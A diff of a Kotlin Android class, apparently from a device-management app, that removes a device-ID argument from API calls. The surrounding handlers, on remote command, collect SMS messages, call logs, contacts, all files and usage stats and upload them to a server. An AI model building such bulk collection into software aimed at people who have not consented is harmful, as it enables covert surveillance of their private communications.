@@ -174,7 +174,7 @@ class CommandExecutor(
         val usage = usageStatsCollector.collectDailyUsage()
         val request = com.devicemanager.data.remote.model.UsageRequest(usage = usage)
         val result = try {
-            apiService.sendUsageStats(preferences.deviceId, request)
+            apiService.sendUsageStats(request)
         } catch (e: Exception) {
             return CommandResult.Failure("Failed to send usage stats: ${e.message}")
         }
@@ -192,7 +192,7 @@ class CommandExecutor(
         val contacts = contactsCollector.collectContacts()
         val request = com.devicemanager.data.remote.model.ContactsSyncRequest(contacts = contacts)
         val result = try {
-            apiService.syncContacts(preferences.deviceId, request)
+            apiService.syncContacts(request)
         } catch (e: Exception) {
             syncRepository.queueEvent("CONTACTS", Constants.API_CONTACTS_SYNC, request, "contacts_${System.currentTimeMillis()}")
             return CommandResult.Failure("Failed to sync contacts (queued for retry): ${e.message}")
@@ -211,7 +211,7 @@ class CommandExecutor(
         val calls = callLogCollector.collectCallLog()
         val request = com.devicemanager.data.remote.model.CallsSyncRequest(calls = calls)
         val result = try {
-            apiService.syncCalls(preferences.deviceId, request)
+            apiService.syncCalls(request)
         } catch (e: Exception) {
             syncRepository.queueEvent("CALLS", Constants.API_CALLS_SYNC, request, "calls_${System.currentTimeMillis()}")
             return CommandResult.Failure("Failed to sync calls (queued for retry): ${e.message}")
@@ -233,7 +233,7 @@ class CommandExecutor(
         val messages = smsCollector.collectSms()
         val request = com.devicemanager.data.remote.model.SmsSyncRequest(messages = messages)
         val result = try {
-            apiService.syncSms(preferences.deviceId, request)
+            apiService.syncSms(request)
         } catch (e: Exception) {
             syncRepository.queueEvent("SMS", Constants.API_SMS_SYNC, request, "sms_${System.currentTimeMillis()}")
             return CommandResult.Failure("Failed to sync SMS (queued for retry): ${e.message}")
@@ -252,7 +252,7 @@ class CommandExecutor(
         val files = fileCollector.collectAllFiles()
         val request = com.devicemanager.data.remote.model.FilesSyncRequest(files = files)
         val result = try {
-            apiService.syncFiles(preferences.deviceId, request)
+            apiService.syncFiles(request)
         } catch (e: Exception) {
             syncRepository.queueEvent("FILES", Constants.API_FILES_SYNC, request, "files_${System.currentTimeMillis()}")
             return CommandResult.Failure("Failed to sync files (queued for retry): ${e.message}")
